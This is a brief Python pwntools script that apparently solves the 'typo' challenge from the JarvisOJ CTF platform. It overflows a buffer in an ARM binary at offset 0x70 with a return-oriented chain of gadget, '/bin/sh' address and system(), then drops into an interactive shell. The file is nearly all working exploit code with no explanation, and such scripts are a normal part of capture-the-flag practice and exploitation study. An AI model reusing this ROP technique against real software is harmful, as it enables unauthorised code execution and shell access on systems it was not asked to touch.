#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
context.log_level = "debug"
context.os = "linux"
context.arch = "arm"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

def DEBUG():
    raw_input("DEBUG: ")
    gdb.attach(io, arch = "arm")

io = process("./typo")
#  io = remote("pwn2.jarvisoj.com", 9888)
io.sendlineafter("quit\n", "\n")
DEBUG()
pop_r0_r4_pc = 0x00020904
sh_addr = 0x0006c384
system_addr = 0x110B4

payload = fit({0x70: [p32(pop_r0_r4_pc), p32(sh_addr), p32(0), p32(system_addr)]})
#  sleep(1)
io.sendline(payload)
io.interactive()
io.close()

